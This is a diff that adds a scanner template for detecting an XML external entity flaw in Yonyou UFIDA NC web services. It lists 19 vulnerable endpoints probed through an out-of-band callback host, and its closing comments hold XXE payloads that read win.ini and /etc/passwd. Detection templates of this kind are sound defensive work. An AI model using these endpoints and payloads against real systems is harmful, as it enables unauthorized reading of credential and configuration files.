@@ -1,0 +1,48 @@
+id: yongyou-UFIDA-NC-xxe
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 用友 NC 多处接口存在XML实体注入漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/Y4-13%E7%94%A8%E5%8F%8B-NC-XXE?id=y4-13%e7%94%a8%e5%8f%8b-nc-xxe
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/uapws/service/nc.itf.bd.crm.IInvclExportToCrmService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.itf.bd.crm.IInvbasdocExportToCrmService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.itf.bap.oba.IObaExcelService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.itf.tb.oba.IOBAMasterNodeWebService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.itf.bd.crm.IUserExportToCrmService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.itf.tb.outlineversion.TbbOutlineUpateVersionService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.imag.itf.ws.IImageInterfaceService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.itf.bd.crm.IAreaclExportToCrmService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.itf.bd.crm.IMeasdocExportToCrmService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.itf.bap.service.IBapIOService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.itf.bd.crm.ICurrtypeExportToCrmService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.uap.oba.wordWebservice.IServiceEntry?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.itf.bd.crm.ICorpExportToCrmService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.itf.ses.DataPowerService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.itf.smart.ISmartQueryWebService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.itf.bd.crm.IPsndocExportToCrmService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.itf.bap.oba.IObaWordService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.itf.bd.crm.ICustomerImportToNcService?xsd=http://{{interactsh-url}}/evil.xml"
+      - "{{BaseURL}}/uapws/service/nc.pubitf.rbac.IUserPubServiceWS?xsd=http://{{interactsh-url}}/evil.xml"
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"      
+
+#windows:
+#<?xml version="1.0"?><!DOCTYPE test [<!ENTITY name SYSTEM "file:///c://windows/win.ini">]>
+#<user><username>&name;</username><password>1</password></user>
+
+#Linux:
+#<?xml version="1.0"?><!DOCTYPE test [<!ENTITY name SYSTEM "file:///etc/passwd">]>
+#<user><username>&name;</username><password>1</password></user>
